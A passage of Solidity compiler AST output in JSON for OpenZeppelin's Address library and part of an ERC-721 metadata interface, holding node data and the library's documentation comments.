token."},"functionSelector":"c87b56dd","id":1158,"implemented":false,"kind":"function","modifiers":[],"name":"tokenURI","nameLocation":"694:8:4","nodeType":"FunctionDefinition","parameters":{"id":1154,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1153,"mutability":"mutable","name":"tokenId","nameLocation":"711:7:4","nodeType":"VariableDeclaration","scope":1158,"src":"703:15:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1152,"name":"uint256","nodeType":"ElementaryTypeName","src":"703:7:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"702:17:4"},"returnParameters":{"id":1157,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1156,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1158,"src":"743:13:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1155,"name":"string","nodeType":"ElementaryTypeName","src":"743:6:4","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"742:15:4"},"scope":1159,"src":"685:73:4","stateMutability":"view","virtual":false,"visibility":"external"}],"scope":1160,"src":"297:463:4","usedErrors":[]}],"src":"112:649:4"},"id":4},"@openzeppelin/contracts/utils/Address.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Address.sol","exportedSymbols":{"Address":[1489]},"id":1490,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1161,"literals":["solidity","^","0.8",".1"],"nodeType":"PragmaDirective","src":"101:23:5"},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"library","documentation":{"id":1162,"nodeType":"StructuredDocumentation","src":"126:67:5","text":" @dev Collection of functions related to the address type"},"fullyImplemented":true,"id":1489,"linearizedBaseContracts":[1489],"name":"Address","nameLocation":"202:7:5","nodeType":"ContractDefinition","nodes":[{"body":{"id":1176,"nodeType":"Block","src":"1241:254:5","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1174,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"expression":{"id":1170,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1165,"src":"1465:7:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1171,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"code","nodeType":"MemberAccess","src":"1465:12:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1172,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"length","nodeType":"MemberAccess","src":"1465:19:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1173,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1487:1:5","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1465:23:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":1169,"id":1175,"nodeType":"Return","src":"1458:30:5"}]},"documentation":{"id":1163,"nodeType":"StructuredDocumentation","src":"216:954:5","text":" @dev Returns true if `account` is a contract.\n [IMPORTANT]\n ====\n It is unsafe to assume that an address for which this function returns\n false is an externally-owned account (EOA) and not a contract.\n Among others, `isContract` will return false for the following\n types of addresses:\n  - an externally-owned account\n  - a contract in construction\n  - an address where a contract will be created\n  - an address where a contract lived, but was destroyed\n ====\n [IMPORTANT]\n ====\n You shouldn't rely on `isContract` to protect against flash loan attacks!\n Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n constructor.\n ===="},"id":1177,"implemented":true,"kind":"function","modifiers":[],"name":"isContract","nameLocation":"1184:10:5","nodeType":"FunctionDefinition","parameters":{"id":1166,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1165,"mutability":"mutable","name":"account","nameLocation":"1203:7:5","nodeType":"VariableDeclaration","scope":1177,"src":"1195:15:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1164,"name":"address","nodeType":"ElementaryTypeName","src":"1195:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1194:17:5"},"returnParameters":{"id":1169,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1168,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1177,"src":"1235:4:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1167,"name":"bool","nodeType":"ElementaryTypeName","src":"1235:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"1234:6:5"},"scope":1489,"src":"1175:320:5","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":1210,"nodeType":"Block","src":"2483:241:5","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1192,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":1188,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"2509:4:5","typeDescriptions":{"typeIdentifier":"t_contract$_Address_$1489","typeString":"library Address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Address_$1489","typeString":"library Address"}],"id":1187,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2501:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1186,"name":"address","nodeType":"ElementaryTypeName","src":"2501:7:5","typeDescriptions":{}}},"id":1189,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2501:13:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1190,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"balance","nodeType":"MemberAccess","src":"2501:21:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"id":1191,"name":"amount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1182,"src":"2526:6:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2501:31:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"416464726573733a20696e73756666696369656e742062616c616e6365","id":1193,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2534:31:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_5597a22abd0ef5332f8053862eb236db7590f17e2b93a53f63a103becfb561f9","typeString":"literal_string \"Address: insufficient balance\""},"value":"Address: insufficient balance"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_5597a22abd0ef5332f8053862eb236db7590f17e2b93a53f63a103becfb561f9","typeString":"literal_string \"Address: insufficient balance\""}],"id":1185,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2493:7:5","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1194,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2493:73:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1195,"nodeType":"ExpressionStatement","src":"2493:73:5"},{"assignments":[1197,null],"declarations":[{"constant":false,"id":1197,"mutability":"mutable","name":"success","nameLocation":"2583:7:5","nodeType":"VariableDeclaration","scope":1210,"src":"2578:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1196,"name":"bool","nodeType":"ElementaryTypeName","src":"2578:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},null],"id":1204,"initialValue":{"arguments":[{"hexValue":"","id":1202,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2626:2:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"id":1198,"name":"recipient","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1180,"src":"2596:9:5","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}},"id":1199,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"call","nodeType":"MemberAccess","src":"2596:14:5","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1201,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"id":1200,"name":"amount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1182,"src":"2618:6:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"src":"2596:29:5","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1203,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2596:33:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"2577:52:5"},{"expression":{"arguments":[{"id":1206,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1197,"src":"2647:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"416464726573733a20756e61626c6520746f2073656e642076616c75652c20726563697069656e74206d61792068617665207265766572746564","id":1207,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2656:60:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_51ddaa38748c0a1144620fb5bfe8edab31ea437571ad591a7734bbfd0429aeae","typeString":"literal_string \"Address: unable to send value, recipient may have reverted\""},"value":"Address: unable to send value, recipient may have reverted"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_51ddaa38748c0a1144620fb5bfe8edab31ea437571ad591a7734bbfd0429aeae","typeString":"literal_string \"Address: unable to send value, recipient may have reverted\""}],"id":1205,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2639:7:5","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1208,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2639:78:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1209,"nodeType":"ExpressionStatement","src":"2639:78:5"}]},"documentation":{"id":1178,"nodeType":"StructuredDocumentation","src":"1501:906:5","text":" @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n `recipient`, forwarding all available gas and reverting on errors.\n https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n of certain opcodes, possibly making contracts go over the 2300 gas limit\n imposed by `transfer`, making them unable to receive funds via\n `transfer`. {sendValue} removes this limitation.\n https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n IMPORTANT: because control is transferred to `recipient`, care must be\n taken to not create reentrancy vulnerabilities. Consider using\n {ReentrancyGuard} or the\n https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern]."},"id":1211,"implemented":true,"kind":"function","modifiers":[],"name":"sendValue","nameLocation":"2421:9:5","nodeType":"FunctionDefinition","parameters":{"id":1183,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1180,"mutability":"mutable","name":"recipient","nameLocation":"2447:9:5","nodeType":"VariableDeclaration","scope":1211,"src":"2431:25:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"},"typeName":{"id":1179,"name":"address","nodeType":"ElementaryTypeName","src":"2431:15:5","stateMutability":"payable","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}},"visibility":"internal"},{"constant":false,"id":1182,"mutability":"mutable","name":"amount","nameLocation":"2466:6:5","nodeType":"VariableDeclaration","scope":1211,"src":"2458:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1181,"name":"uint256","nodeType":"ElementaryTypeName","src":"2458:7:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2430:43:5"},"returnParameters":{"id":1184,"nodeType":"ParameterList","parameters":[],"src":"2483:0:5"},"scope":1489,"src":"2412:312:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1228,"nodeType":"Block","src":"3555:96:5","statements":[{"expression":{"arguments":[{"id":1222,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1214,"src":"3594:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1223,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1216,"src":"3602:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"hexValue":"30","id":1224,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3608:1:5","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"hexValue":"416464726573733a206c6f772d6c6576656c2063616c6c206661696c6564","id":1225,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"3611:32:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_24d7ab5d382116e64324f19950ca9340b8af1ddeb09a8d026e0a3c6a01dcc9df","typeString":"literal_string \"Address: low-level call failed\""},"value":"Address: low-level call failed"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_stringliteral_24d7ab5d382116e64324f19950ca9340b8af1ddeb09a8d026e0a3c6a01dcc9df","typeString":"literal_string \"Address: low-level call failed\""}],"id":1221,"name":"functionCallWithValue","nodeType":"Identifier","overloadedDeclarations":[1269,1313],"referencedDeclaration":1313,"src":"3572:21:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$_t_uint256_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory,uint256,string memory) returns (bytes memory)"}},"id":1226,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3572:72:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1220,"id":1227,"nodeType":"Return","src":"3565:79:5"}]},"documentation":{"id":1212,"nodeType":"StructuredDocumentation","src":"2730:731:5","text":" @dev Performs a Solidity function call using a low level `call`. A\n plain `call` is an unsafe replacement for a function call: use this\n function instead.\n If `target` reverts with a revert reason, it is bubbled up by this\n function (like regular Solidity function calls).\n Returns the raw returned data. To convert to the expected return value,\n use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n Requirements:\n - `target` must be a contract.\n - calling `target` with `data` must not revert.\n _Available since v3.1._"},"id":1229,"implemented":true,"kind":"function","modifiers":[],"name":"functionCall","nameLocation":"3475:12:5","nodeType":"FunctionDefinition","parameters":{"id":1217,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1214,"mutability":"mutable","name":"target","nameLocation":"3496:6:5","nodeType":"VariableDeclaration","scope":1229,"src":"3488:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1213,"name":"address","nodeType":"ElementaryTypeName","src":"3488:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1216,"mutability":"mutable","name":"data","nameLocation":"3517:4:5","nodeType":"VariableDeclaration","scope":1229,"src":"3504:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1215,"name":"bytes","nodeType":"ElementaryTypeName","src":"3504:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"3487:35:5"},"returnParameters":{"id":1220,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1219,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1229,"src":"3541:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1218,"name":"bytes","nodeType":"ElementaryTypeName","src":"3541:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"3540:14:5"},"scope":1489,"src":"3466:185:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1248,"nodeType":"Block","src":"4020:76:5","statements":[{"expression":{"arguments":[{"id":1242,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1232,"src":"4059:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1243,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1234,"src":"4067:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"hexValue":"30","id":1244,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4073:1:5","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"id":1245,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1236,"src":"4076:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1241,"name":"functionCallWithValue","nodeType":"Identifier","overloadedDeclarations":[1269,1313],"referencedDeclaration":1313,"src":"4037:21:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$_t_uint256_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory,uint256,string memory) returns (bytes memory)"}},"id":1246,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4037:52:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1240,"id":1247,"nodeType":"Return","src":"4030:59:5"}]},"documentation":{"id":1230,"nodeType":"StructuredDocumentation","src":"3657:211:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n `errorMessage` as a fallback revert reason when `target` reverts.\n _Available since v3.1._"},"id":1249,"implemented":true,"kind":"function","modifiers":[],"name":"functionCall","nameLocation":"3882:12:5","nodeType":"FunctionDefinition","parameters":{"id":1237,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1232,"mutability":"mutable","name":"target","nameLocation":"3912:6:5","nodeType":"VariableDeclaration","scope":1249,"src":"3904:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1231,"name":"address","nodeType":"ElementaryTypeName","src":"3904:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1234,"mutability":"mutable","name":"data","nameLocation":"3941:4:5","nodeType":"VariableDeclaration","scope":1249,"src":"3928:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1233,"name":"bytes","nodeType":"ElementaryTypeName","src":"3928:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1236,"mutability":"mutable","name":"errorMessage","nameLocation":"3969:12:5","nodeType":"VariableDeclaration","scope":1249,"src":"3955:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1235,"name":"string","nodeType":"ElementaryTypeName","src":"3955:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"3894:93:5"},"returnParameters":{"id":1240,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1239,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1249,"src":"4006:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1238,"name":"bytes","nodeType":"ElementaryTypeName","src":"4006:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"4005:14:5"},"scope":1489,"src":"3873:223:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1268,"nodeType":"Block","src":"4601:111:5","statements":[{"expression":{"arguments":[{"id":1262,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1252,"src":"4640:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1263,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1254,"src":"4648:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1264,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1256,"src":"4654:5:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"416464726573733a206c6f772d6c6576656c2063616c6c20776974682076616c7565206661696c6564","id":1265,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"4661:43:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_88a4a0b5e975840320a0475d4027005235904fdb5ece94df156f3d717cb2dbfc","typeString":"literal_string \"Address: low-level call with value failed\""},"value":"Address: low-level call with value failed"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_stringliteral_88a4a0b5e975840320a0475d4027005235904fdb5ece94df156f3d717cb2dbfc","typeString":"literal_string \"Address: low-level call with value failed\""}],"id":1261,"name":"functionCallWithValue","nodeType":"Identifier","overloadedDeclarations":[1269,1313],"referencedDeclaration":1313,"src":"4618:21:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$_t_uint256_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory,uint256,string memory) returns (bytes memory)"}},"id":1266,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4618:87:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1260,"id":1267,"nodeType":"Return","src":"4611:94:5"}]},"documentation":{"id":1250,"nodeType":"StructuredDocumentation","src":"4102:351:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n but also transferring `value` wei to `target`.\n Requirements:\n - the calling contract must have an ETH balance of at least `value`.\n - the called Solidity function must be `payable`.\n _Available since v3.1._"},"id":1269,"implemented":true,"kind":"function","modifiers":[],"name":"functionCallWithValue","nameLocation":"4467:21:5","nodeType":"FunctionDefinition","parameters":{"id":1257,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1252,"mutability":"mutable","name":"target","nameLocation":"4506:6:5","nodeType":"VariableDeclaration","scope":1269,"src":"4498:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1251,"name":"address","nodeType":"ElementaryTypeName","src":"4498:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1254,"mutability":"mutable","name":"data","nameLocation":"4535:4:5","nodeType":"VariableDeclaration","scope":1269,"src":"4522:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1253,"name":"bytes","nodeType":"ElementaryTypeName","src":"4522:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1256,"mutability":"mutable","name":"value","nameLocation":"4557:5:5","nodeType":"VariableDeclaration","scope":1269,"src":"4549:13:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1255,"name":"uint256","nodeType":"ElementaryTypeName","src":"4549:7:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4488:80:5"},"returnParameters":{"id":1260,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1259,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1269,"src":"4587:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1258,"name":"bytes","nodeType":"ElementaryTypeName","src":"4587:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"4586:14:5"},"scope":1489,"src":"4458:254:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1312,"nodeType":"Block","src":"5139:267:5","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1290,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":1286,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"5165:4:5","typeDescriptions":{"typeIdentifier":"t_contract$_Address_$1489","typeString":"library Address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Address_$1489","typeString":"library Address"}],"id":1285,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5157:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1284,"name":"address","nodeType":"ElementaryTypeName","src":"5157:7:5","typeDescriptions":{}}},"id":1287,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5157:13:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1288,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"balance","nodeType":"MemberAccess","src":"5157:21:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"id":1289,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1276,"src":"5182:5:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5157:30:5","typeDescriptio